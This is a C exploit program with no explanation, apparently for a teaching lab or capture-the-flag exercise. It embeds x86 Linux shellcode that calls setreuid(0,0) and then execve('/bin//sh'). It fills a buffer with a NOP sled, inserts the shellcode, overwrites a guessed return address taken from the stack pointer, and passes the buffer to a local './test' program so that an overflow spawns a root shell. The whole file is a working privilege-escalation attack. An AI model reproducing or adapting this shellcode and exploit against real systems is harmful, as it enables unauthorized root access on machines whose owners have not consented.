#include<stdio.h>
#include<stdlib.h>

char shellcode[]=
"\x31\xc0"
"\x31\xdb"
"\x31\xc9"
"\xb0\x46"
"\xcd\x80"

"\x31\xc0"
"\x50"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x8d\x54\x24\x08"
"\x50"
"\x53"
"\x8d\x0c\x24"
"\xb0\x0b"
"\xcd\x80"

"\x31\xc0"
"\xb0\x01"
"\xcd\x80";

unsigned long get_esp()
{
	__asm__("movl %esp,%eax");
}

int main(int argc,char **argv)
{
	char buf[530];
	char* p;
	unsigned long ret;
	int offset=0;
	if(argc>1)
		offset=atoi(argv[1]);
	ret=get_esp()-offset;
	memset(buf,0x90,sizeof(buf));

	memcpy(buf+512,(char*)&ret,4);

	memcpy(buf+100,shellcode,strlen(shellcode));
	printf("ret is at 0x%8x\n",ret);
	printf("esp is at 0x%8x\n",get_esp());
	execl("./test","test",buf,NULL);

	return 0;
}

